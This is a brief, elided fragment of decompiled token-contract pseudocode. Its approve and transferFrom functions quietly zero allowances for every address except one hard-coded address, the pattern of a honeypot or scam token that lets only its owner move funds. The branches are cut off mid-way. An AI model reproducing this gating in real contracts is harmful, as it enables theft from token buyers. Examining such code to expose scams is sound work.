...
function approve(address arg1, uint256 arg2) payable {
    ...
    if 0xc0b8705c7a18fc55c857823b8d1b950191ee2e4f != msg.sender:
        allowance[address(msg.sender)][address(arg1)] = 0
        emit Approval(4, msg.sender, arg1);
    else:
...
function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    ...
    if not msg.sender:
        revert with 0, 'approve spender is 0 address'
    if arg1 != 0xc0b8705c7a18fc55c857823b8d1b950191ee2e4f:
        allowance[address(arg1)][address(msg.sender)] = 0
        emit Approval(4, arg1, msg.sender);
    else:
